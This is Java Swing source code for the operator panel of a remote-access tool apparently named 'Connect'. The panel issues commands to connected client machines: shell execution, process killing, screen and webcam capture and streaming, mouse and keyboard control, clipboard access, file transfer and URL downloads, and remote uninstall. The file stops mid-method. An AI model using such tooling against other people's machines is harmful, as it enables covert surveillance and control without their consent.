package br.com.introcdc.connect.server;
/*
 * Written by IntroCDC, Bruno Coêlho at 15/01/2025 - 15:46
 */

import br.com.introcdc.connect.Connect;
import br.com.introcdc.connect.server.components.ServerAudioComponents;
import br.com.introcdc.connect.server.components.ServerControlComponents;
import br.com.introcdc.connect.server.components.ServerImageComponents;

import javax.swing.*;
import javax.swing.border.TitledBorder;
import javax.swing.event.DocumentEvent;
import javax.swing.event.DocumentListener;
import java.awt.*;
import java.awt.event.*;
import java.io.File;

public class ConnectServerGUI extends JFrame {

    private static final long serialVersionUID = 1L;

    // Alternar se deseja autocomplete
    public static boolean AUTOCOMPLETE = true;
    public static boolean DARK_MODE = true;
    public static JButton CONTROL = null;
    public static JButton MOUSE = null;
    public static JButton MOUSE_MOVE = null;
    public static JButton MOUSE_MOVE_CLICK = null;
    public static JButton KEYBOARD = null;
    public static JButton AUDIO_USER = null;
    public static JButton AUDIO_SERVER = null;
    public static JFrame CONTROL_FRAME = null;
    public static JFrame AUDIO_CONTROL = null;

    // Todos os comandos para autocomplete
    private static final String[] ALL_COMMANDS = {
            "sel", "list", "help", "desel", "control", "mouse", "mousemove", "mousemoveclick", "keyboard", "duplicate", "fps",
            "info", "restart", "debug", "gc", "ping", "ls", "del", "copy", "move", "mkdir", "cd", "view", "receive", "send",
            "download", "zip", "unzip", "audio", "type", "lclick", "mclick", "rclick", "scroll", "history", "screen", "webcam", "livestopper",
            "cmd", "exec", "log", "kill", "listprocess", "clipboard", "msg", "ask", "chat", "voice", "update", "close", "uninstall"
    };

    // Componentes principais
    private final JTextArea logsArea;
    private final JTextField commandField;
    public static JComboBox<String> clientCombo;

    private final JButton sendButton;
    private final JButton listButton;
    private final JButton helpButton;
    public static JButton controlButton;
    public static JButton duplicateButton;
    public static JButton fpsButton;
    private final JButton folderButton;
    private final JButton clearButton;

    // Popup de sugestões (autocomplete)
    private final JPopupMenu popupSuggestions = new JPopupMenu();
    private final DefaultListModel<String> suggestionsModel = new DefaultListModel<>();
    private final JList<String> suggestionsList = new JList<>(suggestionsModel);

    // Controlar se o autocomplete está habilitado
    private boolean autoCompleteEnabled = true;

    // Singleton
    private static ConnectServerGUI instance;

    public static ConnectServerGUI getInstance() {
        return instance;
    }

    public ConnectServerGUI() {
        super("Painel do Servidor - 0 Clientes Conectados");

        // =============== TENTAR APLICAR NIMBUS ===============
        try {
            UIManager.setLookAndFeel("javax.swing.plaf.nimbus.NimbusLookAndFeel");

            if (DARK_MODE) {
                // Ajustes de cor para o modo escuro via UIManager
                // Você pode ajustar conforme a sua preferência
                UIManager.put("control", new Color(60, 63, 65));
                UIManager.put("text", Color.WHITE);
                UIManager.put("nimbusBase", new Color(18, 30, 49));
                UIManager.put("nimbusFocus", new Color(115, 164, 209));
                UIManager.put("nimbusLightBackground", new Color(60, 63, 65));
                UIManager.put("info", new Color(60, 63, 65));
                UIManager.put("nimbusSelectionBackground", new Color(104, 93, 156));
                UIManager.put("nimbusSelectedText", Color.WHITE);
                UIManager.put("nimbusDisabledText", Color.GRAY);
                UIManager.put("OptionPane.background", new Color(60, 63, 65));
                UIManager.put("Panel.background", new Color(60, 63, 65));
                UIManager.put("TextField.background", new Color(69, 73, 74));
                UIManager.put("TextField.foreground", Color.WHITE);
                UIManager.put("TextArea.background", new Color(69, 73, 74));
                UIManager.put("TextArea.foreground", Color.WHITE);
                UIManager.put("ComboBox.background", new Color(69, 73, 74));
                UIManager.put("ComboBox.foreground", Color.WHITE);
                UIManager.put("Button.background", new Color(77, 77, 77));
                UIManager.put("Button.foreground", Color.WHITE);

                // Recarrega o look atual com as novas cores
                SwingUtilities.updateComponentTreeUI(this);
            }
        } catch (Exception ignored) {
        }

        // =============== CARREGA ÍCONE (opcional) ===============
        ImageIcon icon = null;
        try {
            icon = new ImageIcon(getClass().getResource("/server.png"));
            setIconImage(icon.getImage());
        } catch (Exception e) {
            System.err.println("Não foi possível carregar a imagem: " + e.getMessage());
        }

        // =============== COR DE FUNDO DA JANELA ===============
        if (DARK_MODE) {
            // Caso não queira usar o UIManager para tudo, pode definir manualmente aqui:
            getContentPane().setBackground(new Color(60, 63, 65));  // Ex.: cinza escuro
        }

        // -------------------- Área de Logs --------------------
        logsArea = new JTextArea(20, 70);
        logsArea.setEditable(false);
        logsArea.setFont(new Font("Consolas", Font.PLAIN, 13));
        // Cores manuais caso não queira usar UIManager
        if (DARK_MODE) {
            logsArea.setBackground(new Color(43, 43, 43));
            logsArea.setForeground(Color.WHITE);
        }

        JScrollPane logsScroll = new JScrollPane(logsArea);
        TitledBorder logsBorder = BorderFactory.createTitledBorder("Logs do Servidor");
        logsBorder.setTitleFont(new Font("Arial", Font.BOLD, 12));
        // Ajustar cor do título (frente) e da borda
        if (DARK_MODE) {
            logsBorder.setTitleColor(Color.WHITE);
        }
        logsScroll.setBorder(logsBorder);

        // -------------------- Campo de Comando e Combo de Clientes --------------------
        commandField = new JTextField(25);
        commandField.setFont(new Font("Arial", Font.PLAIN, 13));
        if (DARK_MODE) {
            commandField.setBackground(new Color(69, 73, 74));
            commandField.setForeground(Color.WHITE);
        }

        clientCombo = new JComboBox<>();
        clientCombo.addItem("Nenhum");
        clientCombo.addItem("Todos");
        clientCombo.setFont(new Font("Arial", Font.PLAIN, 13));
        if (DARK_MODE) {
            clientCombo.setBackground(new Color(69, 73, 74));
            clientCombo.setForeground(Color.WHITE);
        }

        sendButton = createButton("Enviar");
        listButton = createButton("Listar");
        helpButton = createButton("Ajuda");
        controlButton = createButton("Controle Remoto");
        duplicateButton = createButton("Duplicatas");
        fpsButton = createButton("FPS (" + ServerImageComponents.FPS + ")");
        folderButton = createButton("Arquivos");
        clearButton = createButton("Limpar");

        // -------------------- Painel Superior (Controle de Comandos) --------------------
        JPanel commandPanel = new JPanel(new FlowLayout(FlowLayout.LEFT, 10, 10));
        commandPanel.setOpaque(false); // para manter a cor do background do container pai

        TitledBorder commandBorder = BorderFactory.createTitledBorder("Controle de Comandos");
        commandBorder.setTitleFont(new Font("Arial", Font.BOLD, 12));
        if (DARK_MODE) {
            commandBorder.setTitleColor(Color.WHITE);
        }
        commandPanel.setBorder(commandBorder);

        JLabel clientLabel = new JLabel("Cliente:");
        clientLabel.setFont(new Font("Arial", Font.PLAIN, 13));
        if (DARK_MODE) {
            clientLabel.setForeground(Color.WHITE);
        }

        JLabel commandLabel = new JLabel("Comando:");
        commandLabel.setFont(new Font("Arial", Font.PLAIN, 13));
        if (DARK_MODE) {
            commandLabel.setForeground(Color.WHITE);
        }

        commandPanel.add(clientLabel);
        commandPanel.add(clientCombo);
        commandPanel.add(commandLabel);
        commandPanel.add(commandField);
        commandPanel.add(sendButton);
        commandPanel.add(listButton);
        commandPanel.add(helpButton);
        commandPanel.add(controlButton);
        commandPanel.add(duplicateButton);
        commandPanel.add(fpsButton);
        commandPanel.add(folderButton);
        commandPanel.add(clearButton);

        // -------------------- Painel Esquerdo (Logs + Controle) --------------------
        JPanel leftPanel = new JPanel(new BorderLayout(10, 10));
        leftPanel.setOpaque(false);
        leftPanel.add(commandPanel, BorderLayout.NORTH);
        leftPanel.add(logsScroll, BorderLayout.CENTER);

        // -------------------- Painel Direito (Ações Rápidas) --------------------
        JPanel rightPanel = new JPanel();
        rightPanel.setOpaque(false);
        rightPanel.setLayout(new BoxLayout(rightPanel, BoxLayout.Y_AXIS));

        TitledBorder quickActionsBorder = BorderFactory.createTitledBorder("Ações Rápidas");
        quickActionsBorder.setTitleFont(new Font("Arial", Font.BOLD, 12));
        if (DARK_MODE) {
            quickActionsBorder.setTitleColor(Color.WHITE);
        }
        rightPanel.setBorder(quickActionsBorder);

        // ------------------------------------------------------------
        // Subpainel: DIVERSOS
        // ------------------------------------------------------------
        JPanel miscPanel = new JPanel(new GridLayout(2, 2, 5, 5));
        miscPanel.setOpaque(false);
        TitledBorder miscBorder = BorderFactory.createTitledBorder("Diversos");
        miscBorder.setTitleFont(new Font("Arial", Font.BOLD, 12));
        if (DARK_MODE) {
            miscBorder.setTitleColor(Color.WHITE);
        }
        miscPanel.setBorder(miscBorder);

        // Botões que não pedem input
        miscPanel.add(createSimpleActionButton("Info", "info"));
        miscPanel.add(createSimpleActionButton("Ping", "ping"));
        miscPanel.add(createSimpleActionButton("Atualizar", "update"));
        miscPanel.add(createSimpleActionButton("Desconectar", "close"));
        miscPanel.add(createSimpleActionButton("Reiniciar", "restart"));
        miscPanel.add(createSimpleActionButton("Desinstalar", "uninstall"));

        // ------------------------------------------------------------
        // Subpainel: COMANDOS
        // ------------------------------------------------------------
        JPanel commandsPanel = new JPanel(new GridLayout(2, 2, 5, 5));
        commandsPanel.setOpaque(false);
        TitledBorder commandsBorder = BorderFactory.createTitledBorder("Comandos");
        commandsBorder.setTitleFont(new Font("Arial", Font.BOLD, 12));
        if (DARK_MODE) {
            commandsBorder.setTitleColor(Color.WHITE);
        }
        commandsPanel.setBorder(commandsBorder);

        // Executar comando (cmd texto)
        commandsPanel.add(createInputActionButton("Executar", "cmd", "Digite o comando a executar:"));

        // Executar comando (cmd texto)
        commandsPanel.add(createInputActionButton("Comando em Processo", "exec", "Digite o id do processo e comando a executar:"));

        // Listar Processos (listprocess)
        commandsPanel.add(createSimpleActionButton("Listar", "listprocess"));

        // Matar Processo (kill id)
        commandsPanel.add(createInputActionButton("Matar", "kill", "Digite o ID do processo:"));

        // Logs (log id)
        commandsPanel.add(createInputActionButton("Logs", "log", "Digite o ID do processo:"));

        // Liberar Memória (gc)
        commandsPanel.add(createSimpleActionButton("Liberar Memória", "gc"));

        // ------------------------------------------------------------
        // Subpainel: MENSAGENS
        // ------------------------------------------------------------
        JPanel messagesPanel = new JPanel(new GridLayout(2, 2, 5, 5));
        messagesPanel.setOpaque(false);
        TitledBorder messagesBorder = BorderFactory.createTitledBorder("Mensagens");
        messagesBorder.setTitleFont(new Font("Arial", Font.BOLD, 12));
        if (DARK_MODE) {
            messagesBorder.setTitleColor(Color.WHITE);
        }
        messagesPanel.setBorder(messagesBorder);

        // Enviar mensagem (msg texto)
        messagesPanel.add(createInputActionButton("Mensagem", "msg", "Digite a mensagem:"));

        // Enviar pergunta (ask texto)
        messagesPanel.add(createInputActionButton("Perguntar", "ask", "Digite a pergunta:"));

        // Abrir Chat (caixa de diálogo)
        messagesPanel.add(createSimpleActionButton("Chat de Texto", "chat <"));

        // Clipboard (receber ou enviar texto)
        messagesPanel.add(createInputActionButton("Texto no Clipboard", "clipboard", "Definir clipboard (<<< para receber o clipboard):"));

        // Reproduzir voz (voice texto)
        messagesPanel.add(createInputActionButton("Reproduzir Voz", "voice", "Digite o texto:"));

        // Áudio
        messagesPanel.add(createSimpleActionButton("Chat de Voz", "audio controls"));

        // ------------------------------------------------------------
        // Subpainel: MOUSE / TECLADO
        // ------------------------------------------------------------
        JPanel mouseKeyboardPanel = new JPanel(new GridLayout(2, 2, 5, 5));
        mouseKeyboardPanel.setOpaque(false);
        TitledBorder mouseBorder = BorderFactory.createTitledBorder("Mouse e Teclado");
        mouseBorder.setTitleFont(new Font("Arial", Font.BOLD, 12));
        if (DARK_MODE) {
            mouseBorder.setTitleColor(Color.WHITE);
        }
        mouseKeyboardPanel.setBorder(mouseBorder);

        // Clique Esquerdo, Meio, Direito
        mouseKeyboardPanel.add(createMouseButton("Clique Esquerdo", "lclick"));
        mouseKeyboardPanel.add(createMouseButton("Clique Direito", "rclick"));
        mouseKeyboardPanel.add(createMouseButton("Clique Meio", "mclick"));

        // Digitar no Teclado
        mouseKeyboardPanel.add(createInputActionButton("Digitar Texto", "type", "Texto para digitar:"));

        // ------------------------------------------------------------
        // Subpainel: TELA E WEBCAM
        // ------------------------------------------------------------
        JPanel screenPanel = new JPanel(new GridLayout(3, 2, 5, 5));
        screenPanel.setOpaque(false);
        TitledBorder screenBorder = BorderFactory.createTitledBorder("Tela e Webcam");
        screenBorder.setTitleFont(new Font("Arial", Font.BOLD, 12));
        if (DARK_MODE) {
            screenBorder.setTitleColor(Color.WHITE);
        }
        screenPanel.setBorder(screenBorder);

        screenPanel.add(createSimpleActionButton("Print da Tela", "screen"));
        screenPanel.add(createSimpleActionButton("Print da Webcam", "webcam"));
        screenPanel.add(createSimpleActionButton("Transmissão de Tela", "screen 1 %fps%"));
        screenPanel.add(createSimpleActionButton("Transmissão da Webcam", "webcam 1 %fps%"));
        screenPanel.add(createSimpleActionButton("Histórico da Tela", "history screen"));
        screenPanel.add(createSimpleActionButton("Histórico da Webcam", "history webcam"));

        // ------------------------------------------------------------
        // Subpainel: PASTAS (GridLayout)
        // ------------------------------------------------------------
        JPanel folderPanel = new JPanel(new GridLayout(3, 2, 5, 5));
        folderPanel.setOpaque(false);
        TitledBorder folderBorder = BorderFactory.createTitledBorder("Pastas");
        folderBorder.setTitleFont(new Font("Arial", Font.BOLD, 12));
        if (DARK_MODE) {
            folderBorder.setTitleColor(Color.WHITE);
        }
        folderPanel.setBorder(folderBorder);

        // Ls / cd / mkdir
        folderPanel.add(createSimpleActionButton("Listar (ls)", "ls"));
        folderPanel.add(createInputActionButton("Entrar (cd)", "cd", "Nome da pasta:"));
        folderPanel.add(createSimpleActionButton("Voltar (cd ..)", "cd .."));
        folderPanel.add(createInputActionButton("Criar Pasta (mkdir)", "mkdir", "Nome da pasta:"));
        folderPanel.add(createSimpleActionButton("Pasta Principal (user.dir)", "cd user.dir"));
        folderPanel.add(createSimpleActionButton("Pasta Usuário (user.home)", "cd user.home"));

        // ------------------------------------------------------------
        // Subpainel: ARQUIVOS (GridLayout)
        // ------------------------------------------------------------
        JPanel filePanel = new JPanel(new GridLayout(5, 2, 5, 5));
        filePanel.setOpaque(false);
        TitledBorder fileBorder = BorderFactory.createTitledBorder("Arquivos");
        fileBorder.setTitleFont(new Font("Arial", Font.BOLD, 12));
        if (DARK_MODE) {
            fileBorder.setTitleColor(Color.WHITE);
        }
        filePanel.setBorder(fileBorder);

        // Receber / Enviar
        filePanel.add(createInputActionButton("Receber (receive)", "receive", "Arquivo/Pasta a receber:"));
        filePanel.add(createInputActionButton("Enviar (send)", "send", "Arquivo/Pasta a enviar:"));

        // Copiar (copy)
        filePanel.add(createInputActionButton("Copiar (copy)", "copy", "Nome do arquivo/pasta-/-nome do arquivo/pasta:"));

        // Mover (move)
        filePanel.add(createInputActionButton("Mover (move)", "move", "Nome do arquivo/pasta-/-nome do arquivo/pasta:"));

        // Excluir (del)
        filePanel.add(createInputActionButton("Excluir (del)", "del", "Nome do arquivo/pasta:"));

        // Baixar (download)
        filePanel.add(createInputActionButton("Baixar (download)", "download", "URL para baixar:"));

        // Zip / Unzip
        filePanel.add(createInputActionButton("Zipar (zip)", "zip", "Pasta ou arquivo:"));
        filePanel.add(createInputActionButton("Deszipar (unzip)", "unzip", "Arquivo.zip:"));

        // Visualizar arquivo (view)
        filePanel.add(createInputActionButton("Visualizar (view)", "view", "Nome do arquivo:"));
        filePanel.add(createInputActionButton("Detalhes (fileinfo)", "fileinfo", "Nome do arquivo:"));

        // ------------------------------------------------------------
        // Adiciona subpainéis ao painel da direita
        // ------------------------------------------------------------
        rightPanel.add(miscPanel);
        rightPanel.add(Box.createVerticalStrut(10));
        rightPanel.add(commandsPanel);
        rightPanel.add(Box.createVerticalStrut(10));
        rightPanel.add(messagesPanel);
        rightPanel.add(Box.createVerticalStrut(10));
        rightPanel.add(mouseKeyboardPanel);
        rightPanel.add(Box.createVerticalStrut(10));
        rightPanel.add(screenPanel);
        rightPanel.add(Box.createVerticalStrut(10));
        rightPanel.add(folderPanel);
        rightPanel.add(Box.createVerticalStrut(10));
        rightPanel.add(filePanel);

        // Scroll para o painel da direita, caso fique grande
        JScrollPane rightScroll = new JScrollPane(rightPanel);
        rightScroll.setPreferredSize(new Dimension(600, 500));
        rightScroll.setBorder(null);

        // -------------------- Layout Principal --------------------
        setLayout(new BorderLayout(10, 10));
        add(leftPanel, BorderLayout.CENTER);
        add(rightScroll, BorderLayout.EAST);

        // -------------------- Autocomplete --------------------
        suggestionsList.setSelectionMode(ListSelectionModel.SINGLE_SELECTION);
        suggestionsList.setFont(new Font("Arial", Font.PLAIN, 13));
        if (DARK_MODE) {
            suggestionsList.setBackground(new Color(69, 73, 74));
            suggestionsList.setForeground(Color.WHITE);
        }
        suggestionsList.addMouseListener(new MouseAdapter() {
            @Override
            public void mouseClicked(MouseEvent e) {
                if (e.getClickCount() == 2) {
                    applySelectedSuggestion();
                }
            }
        });

        JScrollPane scrollSuggestions = new JScrollPane(suggestionsList);
        scrollSuggestions.setPreferredSize(new Dimension(150, 100));
        scrollSuggestions.setBorder(null);
        popupSuggestions.add(scrollSuggestions);

        commandField.getDocument().addDocumentListener(new DocumentListener() {
            @Override
            public void insertUpdate(DocumentEvent e) {
                if (AUTOCOMPLETE) {
                    updateSuggestions();
                }
            }

            @Override
            public void removeUpdate(DocumentEvent e) {
                if (AUTOCOMPLETE) {
                    updateSuggestions();
                }
            }

            @Override
            public void changedUpdate(DocumentEvent e) {
                // não é usado em JTextField
            }
        });

        commandField.addKeyListener(new KeyAdapter() {
            @Override
            public void keyPressed(KeyEvent e) {
                if (popupSuggestions.isVisible()) {
                    int idx = suggestionsList.getSelectedIndex();
                    if (e.getKeyCode() == KeyEvent.VK_DOWN) {
                        if (idx < suggestionsModel.size() - 1) {
                            suggestionsList.setSelectedIndex(idx + 1);
                            suggestionsList.ensureIndexIsVisible(idx + 1);
                        }
                    } else if (e.getKeyCode() == KeyEvent.VK_UP) {
                        if (idx > 0) {
                            suggestionsList.setSelectedIndex(idx - 1);
                            suggestionsList.ensureIndexIsVisible(idx - 1);
                        }
                    } else if (e.getKeyCode() == KeyEvent.VK_ENTER) {
                        applySelectedSuggestion();
                        e.consume(); // evita que o ENTER envie o comando imediatamente
                    }
                }
            }
        });

        // Ações dos botões principais
        sendButton.addActionListener(event -> sendCommand());
        commandField.addActionListener(event -> sendCommand());
        listButton.addActionListener(event -> ConnectServer.handleCommand("list"));
        helpButton.addActionListener(event -> ConnectServer.handleCommand("help"));
        controlButton.addActionListener(event -> remoteControlPanel());
        duplicateButton.addActionListener(event -> ConnectServer.handleCommand("duplicate"));
        fpsButton.addActionListener(event -> {
            String userInput = JOptionPane.showInputDialog(
                    this, "Escolha o FPS", "FPS", JOptionPane.PLAIN_MESSAGE);
            if (userInput != null && !userInput.trim().isEmpty()) {
                ConnectServer.handleCommand("fps " + userInput);
            }
        });
        folderButton.addActionListener(event -> {
            try {
                Desktop.getDesktop().open(new File("connect"));
                ConnectServer.msg("Pasta de recebidos aberta!");
            } catch (Exception exception) {
                ConnectServer.msg("Ocorreu um erro ao abrir a pasta de recebidos!");
            }
        });
        clearButton.addActionListener(event -> {
            logsArea.setText("Servidor iniciado na porta " + Connect.PORT + "\n");
            JOptionPane.showMessageDialog(this, "Console limpo!");
        });

        clientCombo.addItemListener(e -> {
            if (e.getStateChange() == ItemEvent.SELECTED) {
                String selectedItem = (String) e.getItem();
                ConnectServer.msg("Cliente selecionado: " + (selectedItem.equalsIgnoreCase("Todos") || selectedItem.equalsIgnoreCase("Nenhum")
                        ? selectedItem : ConnectServer.CLIENTS.get(Integer.parseInt(selectedItem)).getClientInfo()));
            }
        });

        if (ConnectServer.DISCONNECT_DUPLICATE) {
            duplicateButton.setBackground(Color.GREEN);
        } else {
            duplicateButton.setBackground(Color.RED);
        }
        duplicateButton.setForeground(Color.WHITE);

        if (ServerControlComponents.CONTROL) {
            controlButton.setBackground(Color.GREEN);
        } else {
            controlButton.setBackground(Color.RED);
        }
        controlButton.setForeground(Color.WHITE);

        // Configurações finais da janela
        setDefaultCloseOperation(EXIT_ON_CLOSE);
        pack();
        setLocationRelativeTo(null);
    }

    public static JButton createButton(String text) {
        JButton button = new JButton(text);
        button.setFont(new Font("Arial", Font.BOLD, 13));
        if (DARK_MODE) {
            button.setBackground(new Color(77, 77, 77));
            button.setForeground(Color.WHITE);
        }
        return button;
    }

    // -------------------- Métodos para criar botões --------------------
    public static JButton createSimpleActionButton(String visibleText, String commandToSend) {
        return createSimpleActionButton(visibleText, commandToSend, 11);
    }

    public static JButton createSimpleActionButton(String visibleText, String commandToSend, int font) {
        JButton button = createButton(visibleText);
        button.setFont(new Font("Arial", Font.BOLD, font));
        if (font == 11) {
            button.setMargin(new Insets(2, 5, 2, 5));
        }
        button.addActionListener(e -> sendDirectCommand(commandToSend.replace("%fps%", String.valueOf(ServerImageComponents.FPS))));
        return button;
    }

    public static JButton createInputActionButton(String visibleText, String commandPrefix, String promptMessage) {
        JButton btn = createButton(visibleText);
        btn.setFont(new Font("Arial", Font.BOLD, 11));
        btn.setMargin(new Insets(2, 5, 2, 5));
        configInputButton(btn, visibleText, commandPrefix, promptMessage);
        return btn;
    }

    public static void configInputButton(JButton button, String visibleText, String commandPrefix, String promptMessage) {
        button.addActionListener(e -> {
            String userInput = JOptionPane.showInputDialog(
                    getInstance(), promptMessage, visibleText, JOptionPane.PLAIN_MESSAGE);
            if (userInput != null && !userInput.trim().isEmpty()) {
                sendDirectCommand(commandPrefix + " " + userInput);
            }
            if (commandPrefix.equalsIgnoreCase("voice")) {
                ServerAudioComponents.playText(userInput);
            }
        });
    }

    private JButton createMouseButton(String visibleText, String commandPrefix) {
        JButton btn = createButton(visibleText);
        btn.setFont(new Font("Arial", Font.BOLD, 11));
        btn.setMargin(new Insets(2, 5, 2, 5));

        btn.addActionListener(e -> {
            String coords = JOptionPane.showInputDialog(
                    this,
                    "Digite as coordenadas (x y):",
                    visibleText,
                    JOptionPane.PLAIN_MESSAGE
            );
            if (coords != null && !coords.trim().isEmpty()) {
                sendDirectCommand(commandPrefix + " " + coords);
            } else {
                // Se não digitou coords, ao menos envia "lclick" ou "mclick" etc.
                sendDirectCommand(commandPrefix);
            }
        });
        return btn;
    }

    public static void sendDirectCommand(String command) {
        String selection = (String) clientCombo.getSelectedItem();
        if (selection == null || selection.equals("Nenhum")) {
            ConnectServer.SELECTED_CLIENT = 0;
        } else if (selection.equals("Todos")) {
            ConnectServer.SELECTED_CLIENT = -1;
        } else {
            try {
                int id = Integer.parseInt(selection);
                ConnectServer.SELECTED_CLIENT = id;
            } catch (NumberFormatException ex) {
                log("ID inválido: " + selection);
                return;
            }
        }
        ConnectServer.handleCommand(command);
    }

    // -------------------- Mostrar GUI (Singleton) --------------------
    public static void showGUI() {
        if (instance == null) {
            instance = new ConnectServerGUI();
        }
        instance.setVisible(true);
    }

    // -------------------- Logar mensagens --------------------
    public static void log(String message) {
        if (instance != null) {
            instance.logsArea.append(message + "\n");
            instance.logsArea.setCaretPosition(instance.logsArea.getDocument().getLength());
        }
        System.out.println(message);
    }

    // -------------------- Gerenciar clientes --------------------
    public static void addClient(String clientId) {
        if (instance != null) {
            instance.clientCombo.addItem(clientId);
            int size = ConnectServer.CLIENTS.size();
            String plus = size == 1 ? "" : "s";
            instance.setTitle("Painel do Servidor | " + ConnectServer.CLIENTS.size() + " Cliente" + plus + " Conectado" + plus);
        }
    }

    public static void removeClient(String clientId) {
        if (instance != null) {
            instance.clientCombo.removeItem(clientId);
            int size = ConnectServer.CLIENTS.size();
            String plus = size == 1 ? "" : "s";
            instance.setTitle("Painel do Servidor | " + ConnectServer.CLIENTS.size() + " Cliente" + plus + " Conectado" + plus);
        }
    }

    // -------------------- Enviar comando (campo de texto) --------------------
    private void sendCommand() {
        String command = commandField.getText().trim();
        if (command.isEmpty()) {
            return;
        }

        String selection = (String) clientCombo.getSelectedItem();
        if (selection == null || selection.equals("Nenhum")) {
            ConnectServer.SELECTED_CLIENT = 0;
        } else if (selection.equals("Todos")) {
            ConnectServer.SELECTED_CLIENT = -1;
        } else {
            try {
                int id = Integer.parseInt(selection);
                ConnectServer.SELECTED_CLIENT = id;
            } catch (NumberFormatException e) {
                log("ID inválido: " + selection);
                return;
            }
        }

        ConnectServer.handleCommand(command);
        commandField.setText("");
    }

    // -------------------- Autocomplete --------------------
    private void updateSuggestions() {
        if (!autoCompleteEnabled) {
            popupSuggestions.setVisible(false);
            return;
        }
        String typed = commandField.getText().trim();
        showSuggestions(typed);
    }

    private void showSuggestions(String typed) {
        suggestionsModel.clear();

        if (typed.isEmpty()) {
            popupSuggestions.setVisible(false);
            return;
        }

        for (String cmd : ALL_COMMANDS) {
            if (cmd.toLowerCase().startsWith(typed.toLowerCase())) {
                suggestionsModel.addElement(cmd);
            }
        }

        if (suggestionsModel.isEmpty()) {
            popupSuggestions.setVisible(false);
            return;
        }

        popupSuggestions.show(commandField, 0, commandField.getHeight());
        commandField.requestFocusInWindow();
    }

    private void applySelectedSuggestion() {
        String selectedValue = suggestionsList.getSelectedValue();
        if (selectedValue != null) {
            commandField.setText(selectedValue);
        }
        popupSuggestions.setVisible(false);
        commandField.requestFocusInWindow();
    }

    // -------------------- Getter/Setter para autocomplete --------------------
    public void setAutoCompleteEnabled(boolean enabled) {
        this.autoCompleteEnabled = enabled;
        if (!enabled) {
            popupSuggestions.setVisible(false);
        }
    }

    public JFrame remoteControlPanel() {
        try {
            UIManager.setLookAndFeel("javax.swing.plaf.nimbus.NimbusLookAndFeel");

            if (DARK_MODE) {
                // Ajustes de cor para o modo escuro via UIManager
                UIManager.put("control", new Color(60, 63, 65));
                UIManager.put("text", Color.WHITE);
                UIManager.put("nimbusBase", new Color(18, 30, 49));
                UIManager.put("nimbusFocus", new Color(115, 164, 209));
                UIManager.put("nimbusLightBackground", new Color(60, 63, 65));
                UIManager.put("info", new Color(60, 63, 65));
                UIManager.put("nimbusSelectionBackground", new Color(104, 93, 156));
                UIManager.put("nimbusSelectedText", Color.WHITE);
                UIManager.put("nimbusDisabledText", Color.GRAY);
                UIManager.put("OptionPane.background", new Color(60, 63, 65));
                UIManager.put("Panel.background", new Color(60, 63, 65));
                UIManager.put("TextField.background", new Color(69, 73, 74));
                UIManager.put("TextField.foreground", Color.WHITE);
                UIManager.put("TextArea.background", new Color(69, 73, 74));
                UIManager.put("TextArea.foreground", Color.WHITE);
                UIManager.put("ComboBox.background", new Color(69, 73, 74));
                UIManager.put("ComboBox.foreground", Color.WHITE);
                UIManager.put("Button.background", new Color(77, 77, 77));
                UIManager.put("Button.foreground", Color.WHITE);
            }
        } catch (Exception ignored) {
        }

        if (CONTROL_FRAME != null) {
            CONTROL_FRAME.dispose();
        }

        CONTROL_FRAME = new JFrame("Controle Remoto");
        CONTROL_FRAME.setDefaultCloseOperation(JFrame.DISPOSE_ON_CLOSE);

        ImageIcon icon = null;
        try {
            icon = new ImageIcon(getClass().getResource("/eye.png"));
            CONTROL_FRAME.setIconImage(icon.getImage());
        } catch (Exception e) {
            System.err.println("Não foi possível carregar a imagem: " + e.getMessage());
        }

        // Painel principal para organizar os componentes
        JPanel panel = new JPanel();
        // Como estamos usando Nimbus, o background padrão já pode ser escuro, mas forçamos para garantir
        if (DARK_MODE) {
            panel.setBackground(new Color(60, 63, 65));
        }
        panel.setLayout(new FlowLayout(FlowLayout.CENTER, 20, 20));


        // ---- Botão "Controle Remoto" ----
        CONTROL = new JButton("Controle Remoto");
        if (ServerControlComponents.CONTROL) {
            CONTROL.setBackground(Color.GREEN);
        } else {
            CONTROL.setBackground(Color.RED);
        }
        CONTROL.setForeground(Color.WHITE);

        CONTROL.addActionListener(event -> ConnectServer.handleCommand("control"));
        panel.add(CONTROL);

        // ---- Botão "Mover Mouse" ----
        MOUSE_MOVE = new JButton("Mover Mouse");
        if (ServerControlComponents.MOUSE_MOVE) {
            MOUSE_MOVE.setBackground(Color.GREEN);
        } else {
            MOUSE_MOVE.setBackground(Color.RED);
        }
        MOUSE_MOVE.setForeground(Color.WHITE);

        MOUSE_MOVE.addActionListener(event -> ConnectServer.handleCommand("mousemove"));
        panel.add(MOUSE_MOVE);

        // ---- Botão "Auto Mover" ----
        MOUSE_MOVE_CLICK = new JButton("Auto Mover");
        if (ServerControlComponents.MOUSE_MOVE_CLICK) {
            MOUSE_MOVE_CLICK.setBackground(Color.GREEN);
        } else {
            MOUSE_MOVE_CLICK.setBackground(Color.RED);
        }
        MOUSE_MOVE_CLICK.setForeground(Color.WHITE);

        MOUSE_MOVE_CLICK.addActionListener(event -> ConnectServer.handleCommand("mousemoveclick"));
        panel.add(MOUSE_MOVE_CLICK);

        // ---- Botão "Mouse" ----
        MOUSE = new JButton("Mouse");
        if (ServerControlComponents.MOUSE) {
            MOUSE.setBackground(Color.GREEN);
        } else {
            MOUSE.setBackground(Color.RED);
        }
        MOUSE.setForeground(Color.WHITE);

        MOUSE.addActionListener(event -> ConnectServer.handleCommand("mouse"));
        panel.add(MOUSE);

        // ---- Botão "Teclado" ----
        KEYBOARD = new JButton("Teclado");
        if (ServerControlComponents.KEYBOARD) {
            KEYBOARD.setBackground(Color.GREEN);
        } else {
            KEYBOARD.setBackground(Color.RED);
        }
        KEYBOARD.setForeground(Color.WHITE);

        KEYBOARD.addActionListener(event -> ConnectServer.handleCommand("keyboard"));
        panel.add(KEYBOARD);

        CONTROL_FRAME.setContentPane(panel);
        CONTROL_FRAME.pack();
        CONTROL_FRAME.setLocationRelativeTo(null);

        if (DARK_MODE) {
            SwingUtilities.updateComponentTreeUI(CONTROL_FRAME);
        }

        CONTROL_FRAME.setVisible(true);
        return CONTROL_FRAME;
    }

    public JFrame audioControlPanel() {
        try {
            UIManager.setLookAndFeel("javax.swing.plaf.nimbus.NimbusLookAndFeel");

            if (DARK_MODE) {
                // Ajustes de cor para o modo escuro via UIManager
                UIManager.put("control", new Color(60, 63, 65));
                UIManager.put("text", Color.WHITE);
                UIManager.put("nimbusBase", new Color(18, 30, 49));
                UIManager.put("nimbusFocus", new Color(115, 164, 209));
                UIManager.put("nimbusLightBackground", new Color(60, 63, 65));
                UIManager.put("info", new Color(60, 63, 65));
